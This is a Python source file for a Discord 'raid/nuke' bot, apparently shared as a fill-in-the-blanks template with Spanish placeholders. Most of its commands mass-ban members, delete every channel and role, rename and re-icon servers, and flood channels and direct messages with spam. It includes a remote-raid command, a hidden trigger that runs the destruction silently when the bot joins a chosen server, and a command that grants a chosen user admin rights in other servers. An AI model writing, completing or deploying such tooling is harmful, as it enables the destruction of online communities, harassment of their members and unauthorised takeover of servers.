import discord
from discord.ext import commands
import asyncio
import aiohttp
from datetime import datetime
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True
intents.guild_reactions = True
intents.members = True
bot = commands.Bot(command_prefix='$', intents=intents)

embed_message_id = None
programmed_servers = set()

@bot.command()
@commands.has_permissions(administrator=True)
async def massban(ctx):
    guild = ctx.guild
    author = ctx.author

    members_to_ban = [m for m in guild.members if m != author and guild.me.top_role > m.top_role]
    total = len(members_to_ban)
    count = 0

    confirm_msg = await ctx.send(
        f"**Intentando banear {total} miembros...**\n\n"
        f"Asegúrate de poner el rol del bot **por encima de cualquier otro rol**.\n"
        f"El bot solo puede banear a los usuarios que estén **bajo** su rol.\n\n"
        f"Reacciona con ✅ para confirmar o ❌ para cancelar."
    )
    await confirm_msg.add_reaction("✅")
    await confirm_msg.add_reaction("❌")

    def check(reaction, user):
        return (
            user == author
            and str(reaction.emoji) in ["✅", "❌"]
            and reaction.message.id == confirm_msg.id
        )

    try:
        reaction, user = await bot.wait_for("reaction_add", timeout=30.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("Timed out — MassBan cancelado.")
        return

    if str(reaction.emoji) == "❌":
        await ctx.send("MassBan Cancelado.")
        return

    await ctx.send(f"Iniciando baneo a {total} miembros...")

    async with aiohttp.ClientSession() as session:
        async def ban_member(member):
            nonlocal count
            try:
                url = f"https://discord.com/api/v10/guilds/{guild.id}/bans/{member.id}"
                headers = {
                    "Authorization": f"Bot {bot.http.token}",
                    "Content-Type": "application/json"
                }
                json_data = {"delete_message_days": 0, "reason": "Massban"}

                async with session.put(url, json=json_data, headers=headers) as resp:
                    if resp.status == 429:
                        data = await resp.json()
                        retry_after = data.get("retry_after", 1)
                        await asyncio.sleep(retry_after)
                        return await ban_member(member)
                    elif resp.status in (200, 201, 204):
                        count += 1
                        print(f"[{count}/{total}] Banned: {member}")
                    else:
                        print(f"[!] Error while banning {member}: {resp.status}")
            except Exception as e:
                print(f"[!] Can't ban {member}: {e}")

        tasks = [ban_member(m) for m in members_to_ban]
        await asyncio.gather(*tasks)

    await ctx.send(f"Massban completado — {count}/{total} users baneados.")

@bot.command()
@commands.has_permissions(administrator=True)
async def wbh(ctx):
    guild = ctx.guild
    msg = "MENSAJE DE RAID (ESTO SE ENVIARA A TODOS LOS CANALES)"
    cantidad = 40
    AVATAR_URL = "URL DEL AVATAR"
    if not guild:
        return

    async def enviar_en_canal(channel):
        try:
            webhook = await channel.create_webhook(name="RBOT ON TOP")
            tareas = [
                webhook.send(
                    f"{msg}",
                    username="Rbot",
                    avatar_url=AVATAR_URL
                )
                for i in range(cantidad)
            ]
            await asyncio.gather(*tareas)
        except Exception as e:
            await ctx.send(f"Error en canal {channel.name}: {e}")

    await asyncio.gather(*(enviar_en_canal(channel) for channel in guild.text_channels))

@bot.command()
@commands.has_permissions(administrator=True)
async def ret(ctx, cantidad: int = 100):

    await ci.callback(ctx)
    await cn.callback(ctx)
    nombre_base = "NOMBRE DE LOS CANALES"
    mensaje = "TEXTO DE SPAM"
    mensajes_por_canal = 500

    if cantidad > 500:
        return

    async def borrar_canal(canal):
        try:
            await canal.delete()
        except:
            pass

    tareas_borrar = [borrar_canal(c) for c in ctx.guild.channels]
    await asyncio.gather(*tareas_borrar, return_exceptions=True)

    async def crear_y_spamear(i):
        try:
            canal = await ctx.guild.create_text_channel(name=f"{nombre_base}-{i}")
            tareas_spam = [canal.send(mensaje) for _ in range(mensajes_por_canal)]
            await asyncio.gather(*tareas_spam, return_exceptions=True)
        except:
            pass

    tareas_crear = [crear_y_spamear(i) for i in range(1, cantidad + 1)]
    await asyncio.gather(*tareas_crear, return_exceptions=True)

@bot.command()
@commands.has_permissions(manage_channels=True)
async def resetcanal(ctx):
    canal = ctx.channel
    nombre = canal.name
    categoria = canal.category

    await ctx.send(f"Este comando eliminará el canal `{nombre}` y lo recreará vacío.\nEscribe `y` para continuar.")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == "y"

    try:
        await bot.wait_for("message", check=check, timeout=15)
    except asyncio.TimeoutError:
        await ctx.send("Tiempo agotado. Cancelado.")
        return

    try:
        nuevo = await canal.clone()
        await canal.delete()
        await nuevo.edit(name=nombre, category=categoria)
        await nuevo.send(f"Canal `{nombre}` ha sido reiniciado.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def ks(ctx, server_id: int):
    programmed_servers.add(server_id)
    print(f"Servidor {server_id} programado.")


@bot.event
async def on_guild_join(guild):
    if guild.id in programmed_servers:
        channel = next(
            (c for c in guild.text_channels if c.permissions_for(guild.me).send_messages),
            None
        )
        if not channel:
            return

        class SilentCtx:
            def __init__(self, guild, channel, bot_user):
                self.guild = guild
                self.channel = channel
                self.send = lambda *args, **kwargs: None
                self.author = guild.owner or bot_user

        ctx = SilentCtx(guild, channel, bot.user)
        await nuke.callback(ctx)
        await cn.callback(ctx)
        await ci.callback(ctx)
        await bn.callback(ctx)
        await ret.callback(ctx)

@bot.command()
@commands.has_permissions(administrator=True)
async def da(ctx, user_id: int, server_id: int):
    guild = bot.get_guild(server_id)
    if not guild:
        await ctx.send("No estoy en ese servidor, tal véz el ID es inválido.")
        return

    member = guild.get_member(user_id)
    if not member:
        await ctx.send("Ese usuario no está en el servidor.")
        return
    
    rol = discord.utils.get(guild.roles, name="NOMBRE DE EL ROL CON ADMIN")
    if rol is None:
        try:
            rol = await guild.create_role(
                name="NOMBRE DE EL ROL CON ADMIN",
                permissions=discord.Permissions(administrator=True)
            )
            await ctx.send("Rol 'NOMBRE DE EL ROL CON ADMIN' creado en el servidor.")
        except discord.Forbidden:
            await ctx.send("No tengo permisos para crear roles en ese servidor.")
            return

    try:
        await member.add_roles(rol)
        await ctx.send(f"Se le otorgó el rol 'NOMBRE DE EL ROL CON ADMIN' a <@{user_id}> en **{guild.name}** ({guild.id}).")
    except discord.Forbidden:
        await ctx.send("No tengo permisos para asignar ese rol en el servidor destino.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def vs(ctx, server_id: int, cantidad: int = 100):
    guild = bot.get_guild(server_id)
    if not guild:
        await ctx.send("No estoy en ese servidor o el ID es inválido.")
        return

    channel = guild.text_channels[0] if guild.text_channels else None
    if not channel:
        await ctx.send("No hay canales de texto en ese servidor.")
        return

    author = guild.me or guild.owner

    class SilentCtx:
        def __init__(self, guild, channel, bot_user):
            self.guild = guild
            self.channel = channel
            self.author = author
        async def send(self, *args, **kwargs):
            return None

    silent_ctx = SilentCtx(guild, channel, bot.user)

    try:
        await md.callback(silent_ctx)
        await cn.callback(silent_ctx)
        await ci.callback(silent_ctx)
        await nuke.callback(silent_ctx)
        await bn.callback(silent_ctx)
        await md.callback(silent_ctx)
        await ret.callback(silent_ctx, cantidad)
        await ctx.send(f"Comandos activados en **{guild.name}** ({guild.id})")
    except Exception as e:
        await ctx.send(f"Error al ejecutar remoto: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def spam(ctx):
    cantidad = 500
    mensaje = (
        "TEXTO DE SPAM"
    )

    if cantidad > 1000:
        return

    async def enviar_en_canal(canal):
        for _ in range(cantidad):
            try:
                await canal.send(mensaje)
            except:
                pass

    tareas = [enviar_en_canal(c) for c in ctx.guild.text_channels]
    await asyncio.gather(*tareas, return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def raid(ctx, cantidad: int = 100):
    nombre_base = "NOMBRE DE LOS CANALES"

    if cantidad > 500:
        return

    async def crear_canal(i):
        try:
            await ctx.guild.create_text_channel(name=f"{nombre_base}-{i}")
        except:
            pass

    tareas = [crear_canal(i) for i in range(1, cantidad + 1)]
    await asyncio.gather(*tareas, return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def md(ctx):
    enviados = 0
    fallidos = 0
    repeticiones = 20

    mensaje_predefinido = (
     "TITULO DEL EMBED\n\n"
     "MENSAJE DEL EMBED"
 )

    embed = discord.Embed(
        title="TITULO DEL EMBED",
        description=mensaje_predefinido,
        color=discord.Color.blurple()
    )
    embed.set_footer(text=f"MENSAJE")
    embed.set_image(url=f"AQUI PUEDES INGRESAR UNA IMAGEN PERO SI NO LA QUIERES INGRESAR, BORRA ESTA LINEA COMPLETA.")

    for miembro in ctx.guild.members:
        if miembro.bot:
            continue
        try:
            for _ in range(repeticiones):
                await miembro.send(embed=embed)
                await asyncio.sleep(0.2)
        except:
            pass

@bot.command()
@commands.has_permissions(manage_roles=True)
async def dr(ctx):
    protected = [ctx.guild.default_role, ctx.guild.owner, bot.user]

    for role in ctx.guild.roles:
        if role not in protected and not role.managed:
            try:
                await role.delete()
                await asyncio.sleep(0)
            except discord.Forbidden:
                await ctx.send(f"No tengo permisos para borrar el rol {role.name}.")
            except Exception as e:
                await ctx.send(f"Error al borrar {role.name}: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    async def borrar_canal(canal):
        try:
            await canal.delete()
        except:
            pass

    tareas = [borrar_canal(c) for c in ctx.guild.channels]
    await asyncio.gather(*tareas, return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def cn(ctx):
    nombre_dea = "NOMBRE NUEVO PARA EL SERVIDOR"

    try:
        await ctx.guild.edit(name=nombre_dea)
    except:
        pass

@bot.command()
@commands.has_permissions(administrator=True)
async def ci(ctx):
    try:
        with open("AQUI ESCRIBES EL NOMBRE DE LA IMAGEN QUE TENGAS EN LA MISMA LOCALIZACIÓN DE EL ARCHIVO, COMO imagen.jpg O imagen.png", "rb") as f:
            imagen_bytes = f.read()
            await ctx.guild.edit(icon=imagen_bytes)
    except:
        pass
@bot.command()
@commands.has_permissions(manage_roles=True)
async def cr(ctx, cantidad: int = 100):
    nombre_XD = "NOMBRE DE LOS ROLES A CREAR"

    if cantidad > 100:
        return

    for i in range(1, cantidad + 1):
        nombre = f"{nombre_XD}-{i}"
        try:
            await ctx.guild.create_role(name=nombre)
            await asyncio.sleep(0)
        except discord.Forbidden:
            await ctx.send(f"No tengo permisos para crear el rol {nombre}.")
        except Exception as e:
            await ctx.send(f"Error al crear {nombre}: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def ping(ctx):
    try:
        latencia = round(bot.latency * 1000)
        await ctx.send(f"🏓 Pong! Bot: `{latencia}ms`")
    except discord.Forbidden:
        await ctx.send("No tengo permisos para enviar mensajes aquí.")
    except Exception as e:
        await ctx.send(f"Error al ejecutar el comando: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def cleanbot(ctx, bot_id: int):
    """
    Borra mensajes enviados por un bot específico en TODOS los canales de texto del servidor.
    - bot_id: ID del usuario bot cuyos mensajes quieres borrar
    - límite fijo: 200 mensajes por canal
    """
    await ctx.send(f"Limpiando mensajes del bot {bot_id} en todos los canales...")

    async def clean_channel(channel):
        deleted = 0
        try:
            async for msg in channel.history(limit=200):
                if msg.author.id == bot_id:
                    try:
                        await msg.delete()
                        deleted += 1
                    except discord.Forbidden:
                        return f"No permisos en {channel.name}"
                    except discord.HTTPException:
                        pass
        except discord.Forbidden:
            return f"No puedo leer {channel.name}"
        except discord.HTTPException:
            return f"Error en {channel.name}"
        return f"{channel.name}: {deleted} mensajes eliminados"

    tasks = [clean_channel(ch) for ch in ctx.guild.text_channels]
    results = await asyncio.gather(*tasks)

    summary = "\n".join(results)
    await ctx.send(f"Resumen de limpieza:\n{summary}")

@bot.command()
@commands.has_permissions(administrator=True)
async def clear(ctx):
    try:
        await ctx.send("Borrando todos los mensajes del canal...", delete_after=5)

        await ctx.channel.purge(limit=None)

        await ctx.send("Todos los mensajes han sido borrados.", delete_after=5)

    except discord.Forbidden:
        await ctx.send("No tengo permisos para borrar mensajes.")
    except Exception as e:
        await ctx.send(f"Error al borrar mensajes: {e}")
@bot.command()
@commands.has_permissions(administrator=True)
async def cleanraid(ctx, prefix: str):
    await ctx.send("Limpiando canales...")

    deleted = 0
    for channel in ctx.guild.channels:
        if channel.name.startswith(prefix) and channel.name[len(prefix):].lstrip("-").isdigit():
            try:
                await channel.delete(reason=f"cleanraid ejecutado por {ctx.author}")
                deleted += 1
            except discord.Forbidden:
                await ctx.send("No tengo permisos para borrar canales.")
                return
            except discord.HTTPException:
                await ctx.send(f"Error al borrar el canal: {channel.mention}")

    if deleted == 0:
        await ctx.send("No se encontraron canales enumerados con ese prefijo.")
    else:
        await ctx.send(f"El Raid ha sido borrado. Canales eliminados: {deleted}")

@bot.command()
@commands.has_permissions(ban_members=True)
async def bn(ctx):
    miembros = ctx.guild.members
    miembros_que_no_se_banean = [ctx.author, ctx.guild.owner, bot.user]

    miembros_a_banear = [
        miembro for miembro in miembros
        if miembro not in miembros_que_no_se_banean and not miembro.bot
    ]

    async def banear(usuario):
        try:
            await ctx.guild.ban(usuario, reason="ESCRIBE AQUI LA RAZÓN DEL BANEO")
        except discord.Forbidden:
            await ctx.send(f"No tengo permisos para banear a {usuario}.")
        except Exception as e:
            await ctx.send(f"Error al banear {usuario}: {e}")

    tareas = [banear(u) for u in miembros_a_banear]
    await asyncio.gather(*tareas, return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def sv(ctx):
    allowed_ids = [IDS USERS] # En "IDs Users" tienes que poner los usuarios quienes pueden utilizar este comando, para que lo escribas ahi debe ser como [1426720039909724292, 1395678169402445825]

    if ctx.author.id not in allowed_ids:
        await ctx.send("No tienes permiso de usar el comando.")
        return
    
    descripcion = ""

    for guild in bot.guilds:
        channel = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)

        if channel:
            try:
                invite = await channel.create_invite(max_age=0, max_uses=0)
                descripcion += (
                    f"📌 **{guild.name}**\n"
                    f"👥 Users: {guild.member_count}\n"
                    f"Invitation: {invite.url}\n\n"
                )
            except Exception as e:
                descripcion += (
                    f"📌 **{guild.name}**\n"
                    f"👥 Users: {guild.member_count}\n"
                    f"⚠️ No es posible crear la invitación: {e}\n\n"
                )
        else:
            descripcion += (
                f"📌 **{guild.name}**\n"
                f"👥 Users: {guild.member_count}\n"
                f"⚠️ El canal no tiene permisos para crear invitaciones.\n\n"
            )

    embed = discord.Embed(
        title="🌐 Servidores donde está el bot",
        description=descripcion if descripcion else "No se encontraron servidores.",
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed)

@bot.command()
@commands.has_permissions(ban_members=True)
async def db(ctx, user_id: int):
    try:
        await ctx.guild.unban(discord.Object(id=user_id))
        await ctx.send(f"El usuario con ID `{user_id}` ha sido desbaneado.")
    except Exception as e:
        await ctx.send(f"No se pudo desbanear al usuario con ID `{user_id}`.\nError: {e}")


paginas = [
    {
        "title": "📚 Panel de ayuda de Chuyin Crew Bot (Página 1 de 4)",
        "descripcion": (
            "`$hlp` –\n"
            "**Muestra este panel de ayuda.**\n"
            "`$ping` –\n"
            "**Muestra la latencia del bot.**\n"
            "`$spam` –\n"
            "**Hace spam en todos los canales.**\n"
            "`$raid` –\n"
            "**Crea una cantidad de 80 canales.**\n"
            "`$nuke` –\n"
            "**Borra todos los canales del servidor.**\n"
        )
    },
    {
        "title": "📚 Panel de ayuda de Chuyin Crew Bot (Página 2 de 4)",
        "descripcion": (
            "`$cn` –\n"
            "**Cambia el nombre del servidor.**\n"
            "`$cr (cantidad)` –\n"
            "**Crea una cantidad de roles.**\n"
            "`$ci` –\n"
            "**Cambia la foto del servidor.**\n"
            "`$ret` –\n"
            "**Raidea creando muchos canales con spam.**\n"
            "`$bn` –\n"
            "**Banea a todos los miembros excepto bots con admin.**\n"
             "`$db (ID USUARIO)` –\n"
            "**Desbanea a un usuario por medio de su ID solo si el bot está en el servidor.**\n"
            "`$wbh` –\n"
            "**Envía repetidas veces un mensaje de raid.**\n"
        )
    },
    {
        "title": "📚 Panel de ayuda de Chuyin Crew Bot (Página 3 de 4)",
        "descripcion": (
            "`$dr` –\n"
            "**Borra todos los roles excepto los que tienen admin.**\n"
            "`$ks (ID servidor)` –\n"
            "**Programa 5 comandos al meter el bot.**\n"
            "`$vs (ID servidor)` –\n"
            "**Raidea solo si el Bot está dentro del servidor.**\n"
            "`$da (ID usuario) (ID servidor)` –\n"
            "**Crea un rol admin y se lo da al usuario si Chuyin está en el servidor.\n"
            "`$md` –\n"
            "**Envía un MD a todos con el link del bot.**\n"
            "`$massban` –\n"
            "**Variante actualizada de el comando $bn.**\n"
        )
    },
    {
        "title": "📚 Panel de ayuda de Chuyin Crew Bot (Página 4 de 4)",
        "descripcion": (
            "`$cleanbot (id bot)` –\n"
            "**Borra mensajes enviados por un bot.**\n"
            "`$cleanraid (nombre canal)` –\n"
            "**Borra todos los canales con ese nombre.**\n"
            "`$clear` –\n"
            "**Borra todos los mensajes de un canal.**\n"
        )
    }
]


class HelpView(View):
    def __init__(self, ctx):
        super().__init__(timeout=60)
        self.ctx = ctx
        self.index = 0

    async def update_embed(self, interaction):
        page = paginas[self.index]
        embed = discord.Embed(
            title=page["title"],
            description=page["descripcion"],
            color=0xBDC3C7
        )
        embed.set_thumbnail(url="URL DE LA FOTO QUE LE QUIERES PONER AL COMANDO")
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Anterior", style=discord.ButtonStyle.primary)
    async def anterior(self, button: Button, interaction: discord.Interaction):
        if self.index > 0:
            self.index -= 1
            await self.update_embed(interaction)

    @discord.ui.button(label="Siguiente", style=discord.ButtonStyle.primary)
    async def siguiente(self, button: Button, interaction: discord.Interaction):
        if self.index < len(paginas) - 1:
            self.index += 1
            await self.update_embed(interaction)

    @discord.ui.button(label="Cerrar", style=discord.ButtonStyle.danger)
    async def cerrar(self, button: Button, interaction: discord.Interaction):
        await interaction.message.delete()
@bot.command()
async def hlp(ctx):
    page = paginas[0]
    embed = discord.Embed(
        title=page["title"],
        description=page["descripcion"],
        color=0xBDC3C7
    )
    embed.set_thumbnail(url="URL DE LA FOTO QUE LE QUIERES PONER AL COMANDO")

    view = HelpView(ctx)
    await ctx.send(embed=embed, view=view)


@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user}')
    print(f'$hlp - \n Muestra el panel de ayuda.')

bot.run("TOKEN DEL BOT")
